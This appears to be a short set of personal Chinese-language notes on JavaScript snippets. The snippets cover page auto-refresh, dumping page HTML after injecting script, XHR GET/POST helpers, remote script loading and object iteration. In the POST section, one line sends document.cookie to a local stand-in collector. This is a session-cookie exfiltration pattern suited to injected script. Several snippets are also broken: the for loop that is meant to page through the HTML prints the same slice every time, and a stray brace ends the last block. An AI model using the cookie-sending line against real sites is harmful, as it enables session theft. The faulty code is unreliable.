# NoTitle
- [JavaScript 教程](http://www.runoob.com/js/js-tutorial.html)


# TODO:

- js本地函数调用



## 浏览器网页刷新

```
timeout=prompt("Set timeout (Second):");
count=0
current=location.href;

if(timeout>0)
    setTimeout('reload()',1000*timeout);
else
    location.replace(current);

function reload(){
    setTimeout('reload()',1000*timeout);
    current=location.href;
    count++;
    console.log('每（'+timeout+'）秒自动刷新,刷新次数：'+count);
    fr4me='<frameset cols=\'*\'>\n<frame src=\''+current+'\'/>';
    fr4me+='</frameset>';
    with(document){write(fr4me);void(close())};
}
```

## 枚举当前html页面内容
注入js的情况下，因为缓冲区大小的原因（可能是OD输出内容有限），只能输出部分页面内容，可以通过for循环获得页面内容
```
var test=document.getElementsByTagName('html')[0].innerHTML;console.info(test.substr(0,1000));console.info(test.substr(1000,1000));console.info(test.substr(2000,1000));console.info(test.substr(3000,1000));console.info(test.substr(4000,1000));

// for循环方式
var innerHTML=document.getElementsByTagName('html')[0].innerHTML;
for (var i=0;i<innerHTML.length;i++)
{ 
    console.info(innerHTML.substr(4000,1000));
}
```

## js执行GET、POST请求

```
var get__ = function(url)
{
	var aHttp=new XMLHttpRequest();
	aHttp.open('GET', url);
	aHttp.send();
};
var post__ = function(url, data)
{
	var aHttp=new XMLHttpRequest();
	aHttp.open('POST', url);
	aHttp.send(data);
};
post__('http://127.0.0.1:8090/test', document.cookie);
```

## 加载js（非本地文件）

```
var load_js__ = function(url)
{
    var script = document.createElement('script');
    script.src = url;
    // script.onload = function () { console.log(typeof jQuery) };
    document.body.appendChild(script);
};
load_js__('https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js');
```

## JS数组与对象的遍历

```
var iPrint__ = function(obj)
{
    for(var i in obj)
    {
        console.log(i+":"+obj[i])
    }
};

var arr = [{name:"Jason1"},{name:"Jason2"},{name:"Jason3"},{name:"Jason4"},{name:"Jason5"},{name:"Jason6"},];
iPrint__(arr);
}
```
